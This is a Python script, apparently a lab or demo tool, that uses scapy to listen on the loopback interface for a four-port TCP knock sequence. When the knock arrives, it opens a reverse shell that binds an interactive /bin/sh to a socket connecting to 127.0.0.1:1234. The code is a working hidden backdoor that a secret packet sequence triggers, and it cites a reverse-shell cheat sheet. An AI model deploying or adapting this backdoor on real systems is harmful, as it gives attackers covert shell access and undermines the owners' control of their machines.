from scapy.all import *
import time
import socket,subprocess,os

#grab a shell: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
def shell():
    print "[+] Starting reverse shell"
    prevOutFd = os.dup(1)
    prevInFd = os.dup(0)
    prevErrFd = os.dup(2)
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("127.0.0.1",1234))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])
    s.shutdown(socket.SHUT_RDWR)
    s.close()
    os.dup2(prevOutFd, 1)
    os.close(prevOutFd)
    os.dup2(prevInFd, 0)
    os.close(prevInFd)
    os.dup2(prevErrFd,2)
    os.close(prevErrFd)
    print "shell disconnected"
timeout=1

iface="lo"
global check1
global check2
global check3
global check4
check1=False
check2=False
check3=False
check4=False
ports=[9264, 11780, 2059, 8334]
global last_time
last_time=0

def handler(pkt):
    global last_time
    global check1
    global check2
    global check3
    global check4
    if (pkt.haslayer(TCP) and pkt[TCP].flags==2L and pkt[TCP].dport==ports[0]):
        check1=True
        if (last_time==0):
            print "[*] Got knock1"
            last_time=time.time()
    if (pkt.haslayer(TCP) and pkt[TCP].flags==2L and pkt[TCP].dport==ports[1]):
        if (time.time()-last_time>1):
            check1=False
            check2=False
            check3=False
            check4=False
            last_time=0
        else:
            print "[*] Got knock2"
            check2=True
    if (pkt.haslayer(TCP) and pkt[TCP].flags==2L and pkt[TCP].dport==ports[2]):
        if (time.time()-last_time>1):
            check1=False
            check2=False
            check3=False
            check4=False
            last_time=0
        else:
            print "[*] Got knock3"
            check3=True
    if (pkt.haslayer(TCP) and pkt[TCP].flags==2L and pkt[TCP].dport==ports[3]):
        if (time.time()-last_time>1):
            check1=False
            check2=False
            check3=False
            check4=False
            last_time=0
        else:
            print "[*] Got knock4"
            check4=True
    if (check1 and check2 and check3 and check4):
        check1=False
        check2=False
        check3=False
        check4=False
        last_time=0
        shell()
        return True

sniff(iface=iface,prn=handler,store=0)
